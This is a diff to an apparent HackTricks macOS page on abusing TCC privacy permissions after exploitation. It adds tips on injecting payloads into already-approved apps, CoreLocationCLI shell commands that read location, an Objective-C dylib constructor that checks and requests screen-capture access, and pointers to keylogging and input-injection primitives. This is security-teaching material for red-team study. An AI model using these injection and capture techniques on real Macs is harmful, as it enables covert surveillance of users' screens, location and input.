@@ -2,6 +2,14 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
+> [!TIP]
+> TCC decisions are tied to the **identity of the process** requesting the resource. In post-exploitation, the usual goal is to **inject these payloads into an already-approved app** (or otherwise execute them in its bundle / signature context) instead of running a fresh helper that will trigger its own prompt.
+>
+> For **Screen Recording**, **Input Monitoring**, and **synthetic input**, modern macOS also exposes explicit preflight / request APIs such as `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess`, and `CGRequestPostEventAccess`.
+
+> [!WARNING]
+> This is still a very realistic attack path: recent permission-theft research against Microsoft macOS apps showed that **weak library validation / plugin loading** can let an attacker reuse the victim app's already-granted **camera**, **microphone**, and other TCC permissions without a second prompt.
+
 ### Desktop
 
 - **Entitlement**: None
@@ -668,11 +676,19 @@ void myconstructor(int argc, const char **argv)
 {{#endtab}}
 
 {{#tab name="Shell"}}
-Get access to the location
+Get the current location from shell.
 
+```bash
+# Fast option: use a dedicated CoreLocation CLI helper
+brew install --cask corelocationcli
+CoreLocationCLI --json
+
+# Keep printing updates while the device moves
+CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
 ```
-???
-```
+
+> [!TIP]
+> This still depends on **Location Services** being enabled and the tool / terminal getting TCC approval. `CoreLocationCLI` also relies on Wi-Fi-assisted positioning on most Macs, so having Wi-Fi disabled often ends in `kCLErrorDomain error 0`.
 
 {{#endtab}}
 {{#endtabs}}
@@ -713,6 +729,7 @@ Record the main screen for 5s in `/tmp/screen.mov`
 
 __attribute__((constructor))
 void myconstructor(int argc, const char **argv)
+{
     freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
     AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
     AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
@@ -742,6 +759,29 @@ void myconstructor(int argc, const char **argv)
 
 {{#endtab}}
 
+{{#tab name="ObjectiveC - Check / Prompt"}}
+Check whether the current process can capture the screen and trigger the TCC prompt if needed.
+
+```objectivec
+#import <Foundation/Foundation.h>
+#import <CoreGraphics/CoreGraphics.h>
+
+// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib
+
+__attribute__((constructor))
+static void screencheck(int argc, const char **argv) {
+    freopen("/tmp/logs.txt", "a", stderr);
+    BOOL allowed = CGPreflightScreenCaptureAccess();
+    if (!allowed) {
+        allowed = CGRequestScreenCaptureAccess();
+    }
+    NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
+    fclose(stderr);
+}
+```
+
+{{#endtab}}
+
 {{#tab name="Shell"}}
 Record the main screen for 5s
 
@@ -751,6 +791,9 @@ screencapture -V 5 /tmp/screen.mov
 
 {{#endtab}}
 {{#endtabs}}
+
+> [!TIP]
+> On **macOS 12.3+**, `ScreenCaptureKit` is usually the better post-exploitation primitive than `AVCaptureScreenInput`: it can do high-performance streaming, single-frame grabs with `SCScreenshotManager`, and stream **system audio**. If you also want **microphone** audio, you still need `kTCCServiceMicrophone`. For more desktop-session abuse primitives, see [this related page](../macos-input-monitoring-screen-capture-accessibility.md).
 
 ### Accessibility
 
@@ -927,6 +970,15 @@ int main() {
 
 > [!CAUTION] > **Accessibility is a very powerful permission**, you could abuse it in other ways, for example you could perform the **keystrokes attack** just from it without needed to call System Events.
 
+> [!TIP]
+> Newer macOS versions also split desktop-session abuse across **Input Monitoring** (`kTCCServiceListenEvent`) and **synthetic input** (`kTCCServicePostEvent`). If you need keylogging, screen grabs, or raw event injection instead of AXUIElement automation, check [macOS Input Monitoring, Screen Capture & Accessibility Abuse](../macos-input-monitoring-screen-capture-accessibility.md).
+
+
+
+## References
+
+- [Cisco Talos - How multiple vulnerabilities in Microsoft apps for macOS pave the way to stealing permissions](https://blog.talosintelligence.com/how-multiple-vulnerabilities-in-microsoft-apps-for-macos-pave-the-way-to-stealing-permissions/)
+- [CoreLocationCLI](https://github.com/fulldecent/corelocationcli)
+
+
 {{#include ../../../../banners/hacktricks-training.md}}
-
-
